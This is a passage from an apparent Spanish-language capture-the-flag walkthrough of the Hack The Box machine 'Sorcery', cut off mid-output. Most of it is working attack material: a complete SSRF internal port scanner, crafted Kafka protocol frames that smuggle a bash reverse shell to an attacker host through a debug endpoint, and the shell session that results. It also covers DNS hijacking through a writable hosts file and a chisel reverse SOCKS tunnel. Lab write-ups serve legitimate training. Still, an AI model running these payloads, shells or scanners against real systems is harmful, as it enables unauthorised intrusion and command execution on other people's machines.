            8443: ("HTTPS Alt", "GET / HTTP/1.0\r\n\r\n"),
            9000: ("PHP-FPM", "test"),
            9200: ("Elasticsearch", "GET / HTTP/1.0\r\n\r\n"),
            9300: ("Elasticsearch", "test"),
            11211: ("Memcached", "version\r\n"),
            27017: ("MongoDB", "test"),
        }
        
    def is_port_open(self, response_text):
        """Determina si el puerto está abierto basado en la respuesta"""
        try:
            # Buscar el patrón "Not found" en la respuesta
            if '"error":{"error":"Not found"}' in response_text:
                return False
            # Si no hay "Not found", podría estar abierto
            # Pero también verificamos otras respuestas comunes
            elif '"error"' in response_text:
                # Podría ser otro tipo de error, pero no "Not found"
                return True  # Posiblemente abierto con error diferente
            elif response_text.strip() == "":
                return False  # Respuesta vacía
            else:
                # Cualquier otra respuesta indica algo diferente de "Not found"
                return True
        except:
            return False
    
    def test_port(self, port, service_name="", test_data=""):
        """Testea un puerto específico"""
        try:
            # Convertir test_data a hexadecimal si se proporciona
            if test_data:
                hex_data = test_data.encode().hex()
                payload = f'["127.0.0.1",{port},["{hex_data}"],true,false]'
            else:
                payload = f'["127.0.0.1",{port},[],true,false]'
            
            # Enviar la solicitud
            response = requests.post(
                f"{self.base_url}{self.endpoint}",
                headers=self.headers,
                data=payload,
                timeout=3,
                verify=False
            )
            
            response_text = response.text
            
            # Determinar si el puerto está abierto
            is_open = self.is_port_open(response_text)
            
            if is_open:
                # Intentar extraer más información de la respuesta
                info = f"Puerto {port} ({service_name}) - POSIBLEMENTE ABIERTO"
                
                # Analizar la respuesta para más detalles
                if response.status_code != 200:
                    info += f" | Status: {response.status_code}"
                
                # Ver contenido interesante
                if len(response_text) < 500:  # No mostrar respuestas muy largas
                    info += f" | Response: {response_text[:100]}"
                elif '"error"' in response_text:
                    # Extraer tipo de error si existe
                    try:
                        # Intentar parsear como JSON
                        data = json.loads(response_text)
                        if 'error' in data:
                            error_type = data.get('error', {}).get('error', '')
                            if error_type:
                                info += f" | Error: {error_type}"
                    except:
                        pass
                
                return True, info
            else:
                return False, f"Puerto {port} ({service_name}) - CERRADO/NO RESPONDE"
                
        except requests.exceptions.Timeout:
            # Timeout podría indicar que el puerto está abierto pero no responde rápido
            return True, f"Puerto {port} ({service_name}) - TIMEOUT (posiblemente abierto)"
        except requests.exceptions.ConnectionError:
            return False, f"Puerto {port} ({service_name}) - Error de conexión al servidor"
        except Exception as e:
            return False, f"Puerto {port} ({service_name}) - Error: {str(e)[:50]}"
    
    def test_port_simple(self, port, test_data=""):
        """Versión simple para escaneo rápido"""
        try:
            if test_data:
                hex_data = test_data.encode().hex()
                payload = f'["127.0.0.1",{port},["{hex_data}"],true,false]'
            else:
                payload = f'["127.0.0.1",{port},[],true,false]'
            
            response = requests.post(
                f"{self.base_url}{self.endpoint}",
                headers=self.headers,
                data=payload,
                timeout=2,
                verify=False
            )
            
            return not ('"error":{"error":"Not found"}' in response.text)
        except:
            return False
    
    def scan_common_ports(self, ports_to_scan=None):
        """Escanea puertos comunes"""
        print("[*] Iniciando escaneo de puertos internos vía SSRF")
        print(f"[*] Target: 127.0.0.1 (localhost)")
        print("[*] Detección: Si NO contiene 'Not found' -> Puerto posiblemente abierto")
        print("-" * 70)
        
        open_ports = []
        
        if ports_to_scan is None:
            ports_to_scan = list(self.common_services.keys())
        
        # Escaneo rápido primero (sin payloads específicos)
        print("[*] Fase 1: Escaneo rápido...")
        quick_open = []
        
        with ThreadPoolExecutor(max_workers=15) as executor:
            futures = {}
            for port in ports_to_scan:
                service_name = self.common_services.get(port, ("Unknown", ""))[0]
                futures[executor.submit(self.test_port_simple, port)] = (port, service_name)
            
            for future in futures:
                try:
                    is_open = future.result(timeout=3)
                    port, service_name = futures[future]
                    if is_open:
                        quick_open.append((port, service_name))
                        print(f"[+] Puerto {port} ({service_name}) - Posiblemente ABIERTO")
                except:
                    pass
        
        # Fase 2: Pruebas detalladas para puertos abiertos
        print(f"\n[*] Fase 2: Pruebas detalladas ({len(quick_open)} puertos)...")
        
        for port, service_name in quick_open:
            test_data = self.common_services.get(port, ("", ""))[1]
            is_open, info = self.test_port(port, service_name, test_data)
            if is_open:
                open_ports.append((port, info))
        
        print("-" * 70)
        print(f"[*] Escaneo completado.")
        print(f"[+] Puertos potencialmente accesibles: {len(open_ports)}")
        return open_ports
    
    def scan_range(self, start_port, end_port):
        """Escanea un rango personalizado de puertos"""
        print(f"[*] Escaneando puertos {start_port}-{end_port}")
        print("[*] Esto puede tomar tiempo...")
        
        open_ports = []
        total = end_port - start_port + 1
        batch_size = 50
        
        for batch_start in range(start_port, end_port + 1, batch_size):
            batch_end = min(batch_start + batch_size - 1, end_port)
            current = batch_start
            
            print(f"\n[*] Lote {batch_start}-{batch_end}...")
            
            with ThreadPoolExecutor(max_workers=20) as executor:
                futures = {}
                for port in range(batch_start, batch_end + 1):
                    futures[executor.submit(self.test_port_simple, port)] = port
                
                for future in futures:
                    try:
                        is_open = future.result(timeout=2)
                        port = futures[future]
                        if is_open:
                            # Hacer prueba más detallada
                            is_open_detailed, info = self.test_port(port, "", "")
                            if is_open_detailed:
                                open_ports.append((port, info))
                                print(f"    [+] {info}")
                    except:
                        pass
            
            # Mostrar progreso
            progress = min(current, end_port) - start_port + 1
            percent = (progress / total) * 100
            print(f"[*] Progreso: {progress}/{total} ({percent:.1f}%)")
            time.sleep(0.5)  # Pequeña pausa entre lotes
        
        return open_ports
    
    def test_http_services(self):
        """Pruebas específicas para servicios HTTP/HTTPS"""
        print("\n[*] Probando servicios web con diferentes payloads...")
        
        http_payloads = [
            ("GET / HTTP/1.0\r\nHost: localhost\r\n\r\n", "HTTP Basic"),
            ("GET /admin HTTP/1.0\r\nHost: localhost\r\n\r\n", "Admin Panel"),
            ("GET /console HTTP/1.0\r\nHost: localhost\r\n\r\n", "Console"),
            ("GET /phpinfo.php HTTP/1.0\r\nHost: localhost\r\n\r\n", "PHP Info"),
            ("GET /.env HTTP/1.0\r\nHost: localhost\r\n\r\n", "Env File"),
            ("GET /wp-admin HTTP/1.0\r\nHost: localhost\r\n\r\n", "WordPress"),
        ]
        
        common_web_ports = [80, 443, 3000, 8000, 8080, 8081, 8443, 8888, 9000]
        
        for port in common_web_ports:
            print(f"\n[*] Probando puerto {port}:")
            
            for payload, description in http_payloads:
                hex_data = payload.encode().hex()
                test_payload = f'["127.0.0.1",{port},["{hex_data}"],true,false]'
                
                try:
                    response = requests.post(
                        f"{self.base_url}{self.endpoint}",
                        headers=self.headers,
                        data=test_payload,
                        timeout=3,
                        verify=False
                    )
                    
                    if not ('"error":{"error":"Not found"}' in response.text):
                        print(f"    [+] {description} - Respuesta diferente de 'Not found'")
                        if len(response.text) < 200:
                            print(f"        Content: {response.text[:100]}")
                except:
                    pass
    
    def interactive_test(self):
        """Modo interactivo para probar puertos específicos"""
        print("\n[*] Modo interactivo")
        print("[*] Ingresa 'q' para salir")
        
        while True:
            try:
                port_input = input("\nPuerto a probar (ej: 80, 3000, 6379): ").strip()
                
                if port_input.lower() == 'q':
                    break
                
                port = int(port_input)
                
                # Preguntar por payload personalizado
                custom_payload = input("Payload (dejar vacío para default, 'hex:' para hexadecimal): ").strip()
                
                if custom_payload.startswith('hex:'):
                    hex_data = custom_payload[4:]
                    payload = f'["127.0.0.1",{port},["{hex_data}"],true,false]'
                elif custom_payload:
                    hex_data = custom_payload.encode().hex()
                    payload = f'["127.0.0.1",{port},["{hex_data}"],true,false]'
                else:
                    # Usar payload del servicio si existe
                    service_info = self.common_services.get(port, ("", ""))
                    if service_info[1]:
                        hex_data = service_info[1].encode().hex()
                        payload = f'["127.0.0.1",{port},["{hex_data}"],true,false]'
                    else:
                        payload = f'["127.0.0.1",{port},[],true,false]'
                
                print(f"\n[*] Enviando payload a puerto {port}...")
                print(f"    Payload: {payload[:100]}...")
                
                response = requests.post(
                    f"{self.base_url}{self.endpoint}",
                    headers=self.headers,
                    data=payload,
                    timeout=5,
                    verify=False
                )
                
                print(f"\n[*] Resultado:")
                print(f"    Status Code: {response.status_code}")
                print(f"    Contiene 'Not found': {'SI' if '"error":{"error":"Not found"}' in response.text else 'NO'}")
                print(f"    Longitud respuesta: {len(response.text)} caracteres")
                
                if response.text:
                    print(f"\n[*] Contenido de la respuesta:")
                    print("-" * 40)
                    print(response.text[:500])
                    if len(response.text) > 500:
                        print(f"... (truncado, total: {len(response.text)} caracteres)")
                    print("-" * 40)
                
            except ValueError:
                print("[!] Ingresa un número válido")
            except Exception as e:
                print(f"[!] Error: {str(e)}")

def main():
    # Configuración
    TOKEN = "<TOKEN>"
    NEXT_ACTION = "<NEXT_ACTION>"
    
    # Desactivar advertencias SSL
    requests.packages.urllib3.disable_warnings()
    
    scanner = SSRFScanner(TOKEN, NEXT_ACTION)
    
    print("""
    ╔══════════════════════════════════════════════════════════╗
    ║         SSRF INTERNAL PORT SCANNER - HTB SORCERY         ║
    ║          Detección: "Not found" = Puerto cerrado         ║
    ╚══════════════════════════════════════════════════════════╝
    """)
    
    while True:
        print("\n" + "=" * 60)
        print("OPCIONES:")
        print("  1. Escanear puertos comunes (rápido)")
        print("  2. Escanear rango personalizado")
        print("  3. Probar servicios web específicos")
        print("  4. Modo interactivo (probar puertos manualmente)")
        print("  5. Salir")
        print("=" * 60)
        
        choice = input("\nSelecciona una opción (1-5): ").strip()
        
        if choice == "1":
            print("\n[*] Escaneando puertos comunes...")
            open_ports = scanner.scan_common_ports()
            
            if open_ports:
                print("\n" + "=" * 60)
                print("[+] RESUMEN DE PUERTOS POTENCIALMENTE ABIERTOS:")
                for port, info in open_ports:
                    print(f"  • {info}")
                print("=" * 60)
            else:
                print("\n[-] No se encontraron puertos accesibles")
                
        elif choice == "2":
            try:
                start = int(input("Puerto inicial: "))
                end = int(input("Puerto final: "))
                if start < 1 or end > 65535 or start > end:
                    print("[!] Rango inválido (1-65535)")
                    continue
                
                if (end - start) > 1000:
                    confirm = input(f"[!] Vas a escanear {end-start+1} puertos. ¿Continuar? (s/n): ")
                    if confirm.lower() != 's':
                        continue
                
                open_ports = scanner.scan_range(start, end)
                
                if open_ports:
                    print("\n" + "=" * 60)
                    print(f"[+] {len(open_ports)} puertos encontrados en rango {start}-{end}:")
                    for port, info in open_ports:
                        print(f"  • {info}")
                    print("=" * 60)
                else:
                    print("\n[-] No se encontraron puertos accesibles en ese rango")
                    
            except ValueError:
                print("[!] Ingresa números válidos")
                
        elif choice == "3":
            scanner.test_http_services()
            
        elif choice == "4":
            scanner.interactive_test()
            
        elif choice == "5":
            print("[*] Saliendo...")
            sys.exit(0)
            
        else:
            print("[!] Opción inválida")

if __name__ == "__main__":
    main()
```

Lo ejecutaremos de esta forma:

```shell
python3 reconPorts.py
```

Info:

```
    ╔══════════════════════════════════════════════════════════╗
    ║         SSRF INTERNAL PORT SCANNER - HTB SORCERY         ║
    ║          Detección: "Not found" = Puerto cerrado         ║
    ╚══════════════════════════════════════════════════════════╝


============================================================
OPCIONES:
  1. Escanear puertos comunes (rápido)
  2. Escanear rango personalizado
  3. Probar servicios web específicos
  4. Modo interactivo (probar puertos manualmente)
  5. Salir
============================================================

Selecciona una opción (1-5): 2
Puerto inicial: 20
Puerto final: 10000
[*] Escaneando puertos 20-10000
[*] Esto puede tomar tiempo...

[*] Lote 20-10000...
    [+] Puerto 8000 () - POSIBLEMENTE ABIERTO | Response: 0:["$@1",["eMXTkHuLPViqV0QpNTSCV",null]]
1:{"result":{"data":[]}}

[*] Progreso: 1/12 (78.3%)

============================================================
[+] 1 puertos encontrados en rango 20-10000:
  • Puerto 8000 () - POSIBLEMENTE ABIERTO | Response: 0:["$@1",["eMXTkHuLPViqV0QpNTSCV",null]]
1:{"result":{"data":[]}}

============================================================
```

## Escalate user "user"

### Explotación servicio `kafka`

Veremos que esta funcionando y hay un puerto `8000` abierto, pero no podremos hacer mucho con el, si investigamos mas el `docker-compose.yml` veremos lo siguiente:

```yml
services:
  backend:
  .................<RESTO_DE_INFO>.....................
      WAIT_HOSTS: neo4j:7687, kafka:9092
 .................<RESTO_DE_INFO>.....................

  frontend:
   .................<RESTO_DE_INFO>.....................
      WAIT_HOSTS: backend:8000
	.................<RESTO_DE_INFO>.....................

  dns:
   .................<RESTO_DE_INFO>.....................
      WAIT_HOSTS: kafka:9092
     .................<RESTO_DE_INFO>.....................

  mail_bot:
   .................<RESTO_DE_INFO>.....................
      WAIT_HOSTS: mail:8025
     .................<RESTO_DE_INFO>.....................

  nginx:
    environment:
     .................<RESTO_DE_INFO>.....................
      WAIT_HOSTS: frontend:3000, gitea:3000
     .................<RESTO_DE_INFO>.....................
```

Veremos los apartados de `WAIT_HOSTS` los cuales nos esta descubriendo servicios alojados en `docker` directamente con su puerto y nombre del mismo contenedor `docker`, por lo que vamos a probar a realizar una exfiltracion de informacion con esta informacion mediante el `Debug`.

> Enumeracion

```
SERVICIOS DOCKER ACTIVOS:
----------------------------------------
neo4j: neo4j:7687 (neo4j)
kafka: kafka:9092 (kafka)
backend: backend:8000 (http)
frontend: frontend:3000 (http)
gitea: gitea:3000 (http/gitea)
mail: mail:8025 (smtp)
```

Sabiendo que tenemos esos servicios, el que mas nos llama la atencion es el de `kafka`, ya que si investigamos el codigo de `gitea` veremos esta linea de aqui.

```rust
let Ok(command) = str::from_utf8(message.value) else {
    continue;
};

println!("[*] Got new command: {}", command);

let mut process = match Command::new("bash").arg("-c").arg(command).spawn() {
    Ok(process) => process,
    Err(error) => {
        println!("[-] {error}");
        continue;
    }
};
```

```rust
pub fn update_dns(
    _guard1: RequireAdmin,
    _guard2: RequirePasskey,
    kafka_store: &State<KafkaStore>,
) -> Result<Json<Response>, AppError> {
    let mut producer = kafka_store.producer.lock().unwrap();

    match producer.send(&Record {
        topic: "update",
        partition: -1,
        key: (),
        value: "/dns/convert.sh".as_bytes(),
    }) {
        Ok(_) => Ok(Json(Response {})),
        Err(_) => Err(AppError::Unknown),
    }
}
```

Aqui es donde esta la vulnerabilidad, vemos que el servicio `DNS` ejecuta comandos directamente desde mensajes `kafka`.

El servicio DNS:

1. Escucha el topic `"update"`
2. **Ejecuta cualquier comando que recibe** con `bash -c`
3. Luego envía los resultados al topic `"get"`

Despues de un rato investigando el servicio de `kafka` veremos que hay una herramienta `CLI` del mismo, si nos vamos a su documentacion oficial...

URL = [Documentacion Kafka CLI](https://docs.confluent.io/kafka/operations-tools/kafka-tools.html#kafka-console-consumer-sh)

Vamos a la seccion de `kafka-console-consumer-sh` para ver ese binario en concreto y vemos que podemos realizar una conexion con el servicio para establecer una consola de forma que podamos enviar comandos atraves de ella pudiendo ejecutarlos en el servidor de donde este corriendo dicho servicio.

Pero antes para ello vamos a descargarnos la herramienta:

URL = \[Download kafka Tool]\(wget https://downloads.apache.org/kafka/3.7.0/kafka\_2.13-3.7.0.tgz)

```shell
tar xvf kafka_2.13-3.7.0.tgz
cd kafka_2.13-3.7.0/bin/
```

Si nosotros vemos las opciones de la herramienta veremos que no podemos establecer una comunicacion directa mediante el parametro `--bootstrap-server` ya que tenemos que hacerlo por el `Debug`, hay una forma en la que se puede hacer un poco tediosa y es obtener la respuesta de la herramienta enviando dicha informacion a una escucha y esta misma enviarla por `curl` al servidor de `kafka` por el `Debug` para que lo que nos conteste el servidor reenviarsela a la herramienta.

```shell
./kafka-console-consumer.sh --bootstrap-server localhost:<PORT> --topic update
```

Nos ponemos antes a la escucha con `nc`.

```shell
nc -lvnp <PORT> | xxd -p | tr -d "\n"
```

Despues de haber enviado el comando de la herramienta de `kafka` daremos `Ctrl+C` para pararla.

```
>[2025-12-23 14:47:23,702] WARN [Producer clientId=console-producer] Bootstrap broker Localho st:7777 (id: -1 rack: null) disconnected (org.apache.kafka.clients.NetworkClient)
[2025-12-23 14:47:23,805] WARN [Producer clientId=console-producer] Connection to node -1 (lo calhost/127.0.0.1:7777) could not be established. Node may not be available. (org.apache.kafk a.clients.NetworkClient)
```

Y si vemos la info del `nc` veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 56652
0000003400120003000000000010636f6e736f6c652d70726f647563657200126170616368652d6b61666b612d6a61766106332e372e3200
```

Vemos que requiere de una fase de autenticacion para saber si el servicio esta levantado o no, ahora esto mismo se lo vamos a pasar a `kafka` desde el `Debug`.

```shell
curl -k -X POST "https://sorcery.htb/dashboard/debug" \
-H "Cookie: token=<TOKEN>" \
-H "Next-Action: <NEXT_ACTION>" \
-H "Content-Type: text/plain; charset=UTF-8" \
-d '["kafka", 9092,
["0000003400120003000000000010636f6e736f6c652d70726f647563657200126170616368652d6b61666b612d6a61766106332e372e3200"], true, false]'
```

Info:

```
0:["$@1", ["eMXTKHULPViqVOQpNTSCV",null]]
1:{"result":{"data":["000001d70000000000003a00000000000a0000010000001000000200000008000003000 0000c000008000000090000090000000900000a0000000400000b0000000900000c0000000400000d0000000500000e0000000500000f000000050000100000000400001100000001000012000000030000130000000700001400000006000015000000020000160000000400001700000004000018000000040000190000000300001a0000000300001b0000000100001c0000000300001d0000000300001e0000000300001f000000030000200000000400002100000002000022000000020000230000000400002400000002000025000000030000260000000300002700000002000028000000020000290000000300002a0000000200002b0000000200002c0000000100002d0000000000002e0000000000002f0000000000003000000001000031000000010000320000000000003300000000000037000000010000390000000100003c0000000100003d000000000000400000000000004100000000000042000000000000440000000000004a00000000000000000003001702116d657461646174612e76657273696f6e00010013000108000000000001a08e021702116d657461646174612e76657273696f6e0013001300"]}}
```

Vemos que nos esta respondiendo de forma satisfactoria, por lo que vamos a probar a enviar esto mismo a la herramienta de `kafka` para que esta fase de verificacion pase bien y se piense que esta hablando con el servicio directamente aunque nosotros seamos el intermediario.

```shell

echo '000001d70000000000003a00000000000a00000100000010000002000000080000030000000c000008000000090000090000000900000a0000000400000b00000009000000000000400000d0000000500000e0000000500000f000000050000100000000400001100000001000012000000030000130000000700001400000006000015000000020000160000000400001700000004000018000000040000190000000300001a0000000300001b0000000100001c0000000300001d0000000300001e0000000300001f000000030000200000000400002100000002000022000000020000230000000400002400000002000025000000030000260000000300002700000002000028000000020000290000000300002a0000000200002b0000000200002c0000000100002d0000000000002e0000000000002f0000000000003000000001000031000000010000320000000000003300000000000037000000010000390000000100003c0000000100003d000000000000400000000000004100000000000042000000000000440000000000004a00000000000000000003001702116d657461646174612e76657273696f6e00010013000108000000000001a08e021702116d657461646174612e76657273696f6e0013001300' | xxd -r -p | nc -Lvnp <PORT> | xxd -p| tr -d "\n"
```

Estando a la escucha enviamos el mismo comando:

```shell
./kafka-console-consumer.sh --bootstrap-server localhost:<PORT> --topic update
```

En la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 54448
0000003400120003000000000010636f6e736f6c652d70726f647563657200126170616368652d6b61666b612d6a61766106332e372e32000000001f0003000c000000010010636f6e736f6c652d70726f647563657200010100000000002b00160004000000020010636f6e736f6c652d70726f647563657200007fffffffffffffffffff00
```

Ahora si repetimos el mismo proceso...

```shell
curl -k -X POST "https://sorcery.htb/dashboard/debug" \
-H "Cookie: token=<TOKEN>" \
-H "Next-Action: <NEXT_ACTION>" \
-H "Content-Type: text/plain; charset=UTF-8" \
-d '["kafka", 9092,
["0000003400120003000000000010636f6e736f6c652d70726f647563657200126170616368652d6b61666b612d6a61766106332e372e32000000001f0003000c000000010010636f6e736f6c652d70726f647563657200010100000000002b00160004000000020010636f6e736f6c652d70726f647563657200007fffffffffffffffffff00"], true, false]'
```

Info:

```

0:["$@1", ["eMXTKHULPViqV0QpNTSCV",null]]
2:T460,000001d70000000000003a00000000000a00000100000010000002000000080000030000000c000008000000090000090000000900000a0000000400000b0000000900000c0000000400000d0000000500000e0000000500000f000000050000100000000400001100000001000012000000030000130000000700001400000006000015000000020000160000000400001700000004000018000000040000190000000300001a0000000300001b0000000100001c0000000300001d0000000300001e0000000300001f000000030000200000000400002100000002000022000000020000230000000400002400000002000025000000030000260000000300002700000002000028000000020000290000000300002a0000000200002b0000000200002c0000000100002d0000000000002e0000000000002f0000000000003000000001000031000000010000320000000000003300000000000037000000010000390000000100003c0000000100003d000000000000400000000000004100000000000042000000000000440000000000004a00000000000000000003001702116d657461646174612e76657273696f6e00010013000108000000000001a390021702116d657461646174612e76657273696f6e0013001300000000370000000100000000000200000001066b61666b6100002384000017705857493667304a524f6d34662d31695a5f5948305100000001010000000016000000020000000000000000000000000000000001:{"result":{"data":["$2"]}}
```

Ahora si esto mismo hacemos lo mismo de antes con el `echo` y todo lo demas, cuando ejecutemos la herramienta nos dara una respuesta diferente, esto quiere decir que el proceso de verificacion de esta forma esta funcionando y que nos estamos pudiendo poner en contacto con el puerto atraves de la herramienta de esta forma un poco tediosa, por lo que vamos a probar a modificar el `value` a nuestro gusto que es donde sabemos que se puede ejecutar los comandos y siguiendo este mismo proceso se lo enviaremos al `kafka`.

```shell
echo 'bash -c "id > /dev/tcp/<IP_ATTACKER>/<PORT_ATTACKER>"' | ./kafka-console-producer.sh --bootstrap-server localhost:7777 --topic update
```

Enviaremos el mismo `output` de antes para hacer creer a la herramienta que la verificacion es exitosa y el servicio esta levantado.

```shell
echo '000001d70000000000003a00000000000a00000100000010000002000000080000030000000c000008000000090000090000000900000a0000000400000b00000009000000000000400000d0000000500000e0000000500000f000000050000100000000400001100000001000012000000030000130000000700001400000006000015000000020000160000000400001700000004000018000000040000190000000300001a0000000300001b0000000100001c0000000300001d0000000300001e0000000300001f000000030000200000000400002100000002000022000000020000230000000400002400000002000025000000030000260000000300002700000002000028000000020000290000000300002a0000000200002b0000000200002c0000000100002d0000000000002e0000000000002f0000000000003000000001000031000000010000320000000000003300000000000037000000010000390000000100003c0000000100003d000000000000400000000000004100000000000042000000000000440000000000004a00000000000000000003001702116d657461646174612e76657273696f6e00010013000108000000000001a08e021702116d657461646174612e76657273696f6e0013001300' | xxd -r -p | nc -Lvnp <PORT> | xxd -p| tr -d "\n"
```

Si enviamos el anterior comando veremos en la escucha lo siguiente:

```
listening on [any] 7777
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 38968
0000003400120003000000000010636f6e736f6c652d70726f647563657200126170616368652d6b61666b612d6a61766106332e372e3200000000370003000c000000010010636f6e736f6c652d70726f64756365720002000000000000000000000000000000000775706461746500010000
```

Esto mismo es lo que enviaremos al `curl` de la peticion del `debug` de esta forma:

```shell
curl -k -X POST "https://sorcery.htb/dashboard/debug" \
-H "Cookie: token=<TOKEN>" \
-H "Next-Action: <NEXT_ACTION>" \
-H "Content-Type: text/plain; charset=UTF-8" \
-d '["kafka", 9092,
["0000003400120003000000000010636f6e736f6c652d70726f647563657200126170616368652d6b61666b612d6a61766106332e372e3200000000370003000c000000010010636f6e736f6c652d70726f64756365720002000000000000000000000000000000000775706461746500010000"], true, false]'
```

Pero antes de enviar esto, nos pondremos a la escucha para saber si nos llega la peticion con el comando `id` que hemos realizado anteriormente.

```shell
nc -lvnp <PORT_ATTACKER>
```

Si enviamos el comando no nos llegara nada a la escucha, por alguna razon no esta funcionando, pero deberia.

> Esquema representativo de lo que esta pasando:

<figure><img src="../../.gitbook/assets/deepseek_mermaid_20251223_c54571.svg" alt=""><figcaption></figcaption></figure>

Como no sabia realmente lo que estaba sucediendo detras, probe a `sniffear` la red de `docker` para que cuando enviara el comando viera lo que realmente estaba sucediendo por detras con `Wireshark`.

Para ello importe la imagen de un servidor de `kafka` en `docker` para realizar la prueba que comente.

```shell
docker run -d -p 9092:9092 --name broker apache/kafka:latest
```

Una vez importado, ejecutaremos el siguiente comando:

```shell
echo 'bash -c "bash -i >& /dev/tcp/<IP_ATTACKER>/<PORT_ATACKER> 0>&1"' | ./kafka-console-producer.sh --bootstrap-server localhost:9092 --topic update
```

Antes de enviarlo, vamos abrir `Wireshark` y seleccionar la interfaz de `any` para estar a la escucha de todas las interfaces, despues aplicaremos este filtro.

```
FILTRO = tcp.port == 9092 && ip.addr == 172.17.0.1
# Seguidamente ordenaremos por protocolo
```

Y si enviamos el comando anterior veremos lo siguiente en `Wireshark`:

<figure><img src="../../.gitbook/assets/Pasted image 20251223171849.png" alt=""><figcaption></figcaption></figure>

El que mas nos interesa es el `Request` que es lo que hemos enviado nosotros, si nos vamos al contenido de la peticion veremos esto otro:

<figure><img src="../../.gitbook/assets/Pasted image 20251223171928.png" alt=""><figcaption></figcaption></figure>

Estamos viendo el codigo en `hexadecimal` de la peticion que requiere el servidor de `kafka` y como ya lo estamos viendo hay directamente, en vez de crearlo nosotros vamos a copiar ese mismo codigo y enviarselo al servidor de `kafka` mediante el `Debug` mientras estamos a la escucha de esta forma:

Primero nos pondremos a la escucha.

```shell
nc -lvnp <PORT_ATTACKER> 
```

Ahora enviaremos este comando:

```shell
curl -k -X POST "https://sorcery.htb/dashboard/debug" \
-H "Cookie: token=<TOKEN>" \
-H "Next-Action: <NEXT_ACTION>" \
-H "Content-Type: text/plain; charset=UTF-8" \
-d '["kafka", 9092,
["000000aa0000000000000050010636f6e736f6c652d70726f64756365720000ffff000005dc020775706461746502000000007800000000000000000000006bffffffff02a31562d20000000000000000019b4bf3ae440000019b4bf3ae4400000000000000020000000000000000000172000000016662617368202d63202262617368202d69203e26202f6465762f7463702f31302e31302e31342e32352f3737353520303e26312200000000"], true, false]'
```

Si volvemos a donde tenemos la escucha, veremos lo siguiente:

```
listening on [any] 7755 ...
connect to [10.10.14.25] from (UNKNOWN) [10.10.11.73] 38198
bash: cannot set terminal process group (20): Inappropriate ioctl for device bash: no job control in this shell
bash: /root/.bashrc: Permission denied
user@7bfb70ee5b9c:/app$ whoami
whoami
user
```

Vemos que funciono, hemos obtenido una `shell` como el usuario `user`, por lo que vamos a sanitizar la `shell`.

### Sanitizacion de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user tom\_summers

### DNS HIJACKING

Si investigamos un poco veremos que estamos en un `docker`, dentro de este veremos una carpeta `dns` en la raiz la cual contiene lo siguiente:

```
total 10032
drwxr-xr-x 1 user user     4096 Dec 23 12:10 .
drwxr-xr-x 1 root root     4096 Apr 28  2025 ..
-rwxr-xr-x 1 root root      364 Aug 31  2024 convert.sh
-rwxr--r-- 1 user user      654 Dec 23 16:40 entries
-rw-r--r-- 1 root root      624 Dec 23 11:41 hosts
```

Y veremos el archivo `convert.sh` que contiene este codigo:

> convert.sh

```bash
#!/bin/bash

entries_file=/dns/entries
hosts_files=("/dns/hosts" "/dns/hosts-user")

> $entries_file

for hosts_file in ${hosts_files[@]}; do
  while IFS= read -r line; do
    key=$(echo $line | awk '{ print $1 }')
    values=$(echo $line | cut -d ' ' -f2-)

    for value in $values; do
      echo "$key $value" >> $entries_file
    done
  done < $hosts_file
```

Vemos que tiene como archivos base el `hosts` y el `hosts-user`, pero sin embargo el `hosts-user` no esta creado.

Vamos a crear el archivo de esta forma:

```shell
echo "<IP_ATTACKER> diseo.sorcery.htb" > /dns/hosts-user
```

Echo esto vamos a ejecutar la herramienta de esta forma:

```shell
./convert.sh
```

Ahora si esperamos un poco veremos que en el `entries` se añadio de forma correcta nuestro `host` y si nos vamos a la pagina, en la seccion de `DNS` si recargamos y solicitamos de nuevo los `DNSs` veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Pasted image 20251223174835.png" alt=""><figcaption></figcaption></figure>

Se añadio bien, por lo que ahora esta resolviendo a nuestra `IP`, pero antes vamos a tunelizarnos la maquina victima a nuestro atacante, para asi poder trabajar mejor desde el mismo con `chisel`.

URL = [Download Chisel GitHub](https://github.com/jpillora/chisel)

Primero tendremos que establecer un servidor de `chisel` desde el atacante y posteriormente ejecutar en la victima el otro comando de `chisel` para que actue como cliente que se conecta a nuestro servidor tunelizando todo el trafico del mismo.

> Victima

```shell
./chisel client http://<IP>:9000 R:socks
```

> Atacante

```shell
chisel server -p 9000 --reverse --socks5
```

En la victima veremos lo siguiente:

```
2025/12/23 16:55:26 client: Connecting to ws://10.10.14.25:9000
2025/12/23 16:55:26 client: Connected (Latency 42.070621ms)
```

Y en el atacante esto otro:

```
2025/12/23 17:54:40 server: Reverse tunnelling enabled
2025/12/23 17:54:40 server: Fingerprint uOoxw0smKOqS+i51cVtS9YERNvk8pHHJiWTTvQcFXH0=
2025/12/23 17:54:40 server: Listening on http://0.0.0.0:9000
2025/12/23 17:55:23 server: session#1: Client version (1.11.3) differs from server version (1.11.3-0kali1)
2025/12/23 17:55:23 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

Con esto vemos que el tunel se establecio de forma correcta, por lo que podremos trabajar desde nuestro `kali` sin problema.

Tambien tendremos que configurar `proxychains4` de esta forma:

```shell
nano /etc/proxychains4.conf

# Dentro del nano
socks5 127.0.0.1 1080
```

Lo guardamos y podremos poner delante `proxychains4` para que lo pille bien desde el servidor victima.

Vamos a probar a realizar un `dns hijacking`, para ello como ya hemos creado un `subdominio` propio que apunta a nuestro servidor del atacante, vamos añadirlo a nuestro `hosts` de la maquina atacante.

```shell
nano /etc/hosts

#Dentro del nano
<IP_ATTACKER>       diseo.sorcery.htb
```

### CONSEGUIR CERTIFICADOS SSL

Lo guardamos y con esto ya se podra resolver bien desde nuestro `kali`, si visualizamos el `docker-compose.yml` recordemos que tenemos un servicio `ftp` y otro `mail`, en el `ftp` veremos que se puede entrar de forma anonima, por lo que vamos a realizar un `nslookup` del `FTP` para saber en que `IP` esta (Todo esto desde la maquina victima de la `shell`).

```shell
nslookup ftp
```

Info:

```
Server:		127.0.0.11
Address:	127.0.0.11#53

Non-authoritative answer:
Name:	ftp
